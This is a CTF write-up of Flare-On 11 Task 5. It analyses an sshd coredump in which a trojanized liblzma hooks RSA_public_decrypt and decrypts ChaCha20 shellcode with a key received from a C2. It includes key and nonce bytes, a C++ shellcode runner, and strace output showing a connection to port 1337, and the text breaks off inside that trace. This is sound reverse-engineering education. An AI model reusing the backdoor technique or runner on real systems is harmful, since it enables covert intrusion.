---
title: Flare-On 11 – Task 5
url: https://hshrzd.wordpress.com/2024/12/08/flare-on-11-task-5/
source: hasherezade's 1001 nights
date: 2024-12-09
fetch_date: 2025-10-06T19:35:52.903043
---

# Flare-On 11 – Task 5

[hasherezade's 1001 nights](https://hshrzd.wordpress.com/ "hasherezade's 1001 nights")

projects and tasks that I do in my free time

[![](https://hshrzd.wordpress.com/wp-content/uploads/2024/12/coredump-file-with-an-sshd-backdoor.png?w=940&h=198&crop=1)](https://hshrzd.wordpress.com/ "hasherezade's 1001 nights")

[Skip to content](#content "Skip to content")

* [Home](https://hshrzd.wordpress.com)
* [Projects](https://hshrzd.wordpress.com/mycode/)
  + [PE-sieve](https://hshrzd.wordpress.com/pe-sieve/)
  + [PE\_unmapper](https://hshrzd.wordpress.com/pe_unmapper/)
  + [IAT Patcher](https://hshrzd.wordpress.com/iat-patcher/)
  + [PE-bear](https://hshrzd.wordpress.com/pe-bear/)
  + [ViDi](https://hshrzd.wordpress.com/vidi-visual-disassembler/)
  + [DMA Unlocker](https://hshrzd.wordpress.com/mycode/dma-unlocker/)
* [How to start RE/malware analysis?](https://hshrzd.wordpress.com/how-to-start/)

[← Flare-On 11 – Task 9](https://hshrzd.wordpress.com/2024/10/29/flareon-11-task-9/)

[Flare-On 11 – Task 7 →](https://hshrzd.wordpress.com/2024/12/09/flare-on-11-task-7/)

## [Flare-On 11 – Task 5](https://hshrzd.wordpress.com/2024/12/08/flare-on-11-task-5/)

Posted on [December 8, 2024](https://hshrzd.wordpress.com/2024/12/08/flare-on-11-task-5/ "7:28 pm") by [hasherezade](https://hshrzd.wordpress.com/author/hshrzd/ "View all posts by hasherezade")

*[Flare-On](https://flare-on.com/) is an annual CTF run by [Mandiant Flare Team](https://cloud.google.com/blog/topics/threat-intelligence/flareon-11-challenge-solutions). In this series of writeups I present solutions to some of my favorite tasks from this year. All the sourcecodes are available on my Github, in dedicated repository: [flareon2024](https://github.com/hasherezade/flareon2024)*.

The 5-th task comes with the following description:

```
sshd

Our server in the FLARE Intergalactic HQ has crashed!
Now criminals are trying to sell me my own data!!!
Do your part, random internet hacker, to help FLARE out
and tell us what data they stole! We used the best forensic
preservation technique of just copying all the files on the system for you.

7zip archive password: flare
```

We are provided with the archive containing a Docker container with Linux installation. Since the title of the task suggests that it is related to SSH, we can start by searching any artifacts related to this service.

```
$ tree | grep sshd

    │   │   ├── sshd
    │   │   ├── sshd_config
    │   │   ├── sshd_config.d
    │   │   │   ├── sshd.service
    │   ├── sshd
    │   │   ├── sshd
    │   │   │   │   ├── sshd_config.5.gz
    │   │   │   │   ├── sshd.8.gz
    │   │   │   ├── sshd_config
    │   │   │   └── sshd_config.md5sum
    │   │   │       │   ├── sshdconfig.vim
        │   │   │   └── sshd.core.93794.0.0.11.1725917676
        │   │   │   ├── sshd.service
        │   │   │   └── _etc_ssh_sshd_config
```

It turns out that there is a coredump created when the SSH deamon crashed. The dump is located in: `/var/lib/systemd/coredump/sshd.core.93794.0.0.11.1725917676` . The relevant binary can be found in: `/sbin/sshd` .

Let’s load them both together under GDB and check:

```
$ gdb sshd sshd.core.93794.0.0.11.1725917676
```

![](https://hshrzd.wordpress.com/wp-content/uploads/2024/12/info_stack.png?w=1024)

```
gef➤  info stack
#0  0x0000000000000000 in ?? ()
#1  0x00007f4a18c8f88f in lzma_str_list_filters () from /lib/x86_64-linux-gnu/liblzma.so.5
Backtrace stopped: previous frame inner to this frame (corrupt stack?)
```

The callstack points that there is a crash in libzma. Let’s display the list of all loaded libraries, to see where we can find the relevant module. It can be done with the command `info sharedlibrary`.

```
gef➤  info sharedlibrary
From                To                  Syms Read   Shared Object Library
[...]
0x00007f4a18c8a4e8  0x00007f4a18cab6d7  Yes (*)     /lib/x86_64-linux-gnu/liblzma.so.5
[...]
```

The libzma library is a part of xz-utils. At this point, it reminded me of the XZ backdoor that made the news earlier this year. Details of it were described i.e. [here](https://securelist.com/xz-backdoor-part-3-hooking-ssh/113007/). In case of that backdoor, the **`RSA_public_decrypt`** function was hooked, and augmented with malicious code. So I expected to find something similar in the current task. The version affected by the trojan ([5.6.0 and 5.6.1](https://discourse.nixos.org/t/cve-2024-3094-malicious-code-in-xz-5-6-0-and-5-6-1-tarballs/42405))is different than the one used in the task (5.4.1). But either way, let’s look inside.

First, I fetched the `liblzma.so.5` module from the relevant location, and opened it in IDA. Looking at the strings we can find that indeed the name **`RSA_public_decrypt`** is referenced. Checking where the references leads to, we can see the function that installs a hook.

![](https://hshrzd.wordpress.com/wp-content/uploads/2024/12/install_hook.png?w=856)

The hook is responsible for executing some potentially malicious payload. This path of execution will be triggered if the data received by the `RSA_public_decrypt` function starts with a predefined magic number. After a quick analysis, we can see that the ChaCha20 algorithm is used to protect the payload.

![](https://hshrzd.wordpress.com/wp-content/uploads/2024/12/decrypt_shellcode-1.png?w=715)

The shellcode is hardcoded in the binary, while the key is received from the C2 in the packet starting with `0xC5407A48` magic.

The encrypted shellcode:

![](https://hshrzd.wordpress.com/wp-content/uploads/2024/12/enc_shellcode.png?w=364)

We can possibly find the packet in the memory saved in the crashdump.

Searching the DWORD `0xC5407A48` (`487A40C5` in little endian) leads to the following data chunk:

![](https://hshrzd.wordpress.com/wp-content/uploads/2024/12/buffer.png?w=629)

The magic DWORD is followed by the key and nonce used to initialize the ChaCha20 context.

Analyzing the Chacha20\_init function we can see clearly how the key and the nonce are loaded:

![](https://hshrzd.wordpress.com/wp-content/uploads/2024/12/chacha20_init.png?w=659)

The ChaCha20 key is 32-bytes long, and the nonce is 12-bytes long. The relevant buffers can be extracted from the packet:

```
94 3D F6 38 A8 18 13 E2 DE 63 18 A5 07 F9 A0 BA 2D BB 8A 7B A6 36 66 D0 8D 11 A6 5E C9 14 D6 6F
F2 36 83 9F 4D CD 71 1A 52 86 29 55 58 58 D1 B7
```

Having all needed data, we can decrypt is with [CyberChef](https://gchq.github.io/CyberChef/). The decrypted content ([decrypted.dat](https://github.com/hasherezade/flareon2024/blob/main/task5/decrypted.dat)) reveals patterns typical for shellcode.

Now, let’s load the result into IDA and have a closer look…

![](https://hshrzd.wordpress.com/wp-content/uploads/2024/12/shc_start.png?w=581)

It calls different system functions via direct syscalls.

![](https://hshrzd.wordpress.com/wp-content/uploads/2024/12/use_syscalls.png?w=460)

To get a quick understanding of what is going on, I decided to just run the shellcode and observe it. I adapted the fragment of the original function responsible for deploying it:

```
int main()
{
	const size_t shellc_size = sizeof(shellc_data);
	void* buf = mmap(0LL, shellc_size, 7, 34, -1, 0LL);
	void *shellc = memcpy(buf, shellc_data, shellc_size);
	int (*shc_main)() = (int(*)())shellc;
	std::cout << "Running the shellcode: " << std::hex << shellc << "\n";
	shc_main();
	std::cout << "Finished!\n";
	return 0;
}
```

Then, traced the runner with `strace`, getting the following:

```
write(1, "Running the shellcode: 0x779d190"..., 38Running the shellcode: 0x779d1905a000
) = 38
socket(AF_INET, SOCK_STREAM, IPPROTO_TCP) = 3
connect(3, {sa_family=AF_INET, sin_port=htons(1337), sin_addr=inet_addr("10.0.2.15")}, 16) = -1 ECONNREFUSED (Connection refused)
recvfrom(-111, 0x7ffca53af038, 32, 0, NULL, NULL) = -1 EBADF (Bad file descriptor)
recvfrom(-111, 0x7ffca53af058, 12, 0, NULL, NULL) = -1 EBADF (Bad file descriptor)
recvfrom(-111, 0x7ffca53b01e8, 4, 0, NULL, NULL) = -1 EBADF (Bad file descri...